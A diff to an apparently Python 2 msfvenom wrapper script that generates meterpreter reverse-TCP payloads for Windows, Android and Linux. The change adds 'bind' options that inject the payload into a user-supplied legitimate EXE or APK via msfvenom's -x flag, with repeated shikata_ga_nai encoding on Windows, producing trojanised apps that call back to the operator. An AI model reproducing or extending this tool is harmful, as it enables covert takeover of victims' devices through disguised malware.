@@ -33,11 +33,11 @@ print ("                                                     --version 1.0")
 os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
 print
 print (" Author NAME      :   VAMSI")
-print (" YOUTUBE CHANNEL  :   HAKDAD")
+print (" YOUTUBE CHANNEL  :   CyberSec Academy - Telugu")
 print (" INSTAGRAM ID     :   Mr_kali_hacker")
 print
 
-os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYSTEM \n\t\t\t1.windows\n\t\t\t2.android\n\t\t\t3.linux\033[97m\n>>> \033[93m""")
+os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYSTEM \n\t\t\t1.windows\n\t\t\t2.android\n\t\t\t3.linux\033[97m\n\t\t\t4.windows bind\n\t\t\t5.android bind\n>>> \033[93m""")
                                        
 ip_address = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Your IP Address : \033[97m>>> \033[93m")
 port_given = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Port Number     : \033[97m>>> \033[93m")
@@ -56,6 +56,20 @@ if os == "3":
 	formation = "sh"
 	platform = "Linux"
 	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)
+
+if os == "5":
+	payload = "android/meterpreter/reverse_tcp"
+	formation = "apk"
+	platform = "Android"
+	original = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER ORIGINAL APK FILE NAME WITH DIRECTORY    : \033[97m>>> \033[93m")
+	command = r"msfvenom -x {6} -p {0} LHOST={1} LPORT={2} > {3}/{4}.{5}".format( payload, ip_address, port_given, save_directory, name, formation, original)
+
+if os == "4":
+	payload = "windows/meterpreter/reverse_tcp"
+	formation = "exe"
+	platform = "Windows"
+	original = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER ORIGINAL EXE FILE NAME WITH DIRECTORY    : \033[97m>>> \033[93m")
+	command = r"msfvenom --platform {0} -x {7} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation, original)
 
 if os == "2":
 	payload = "android/meterpreter/reverse_tcp"
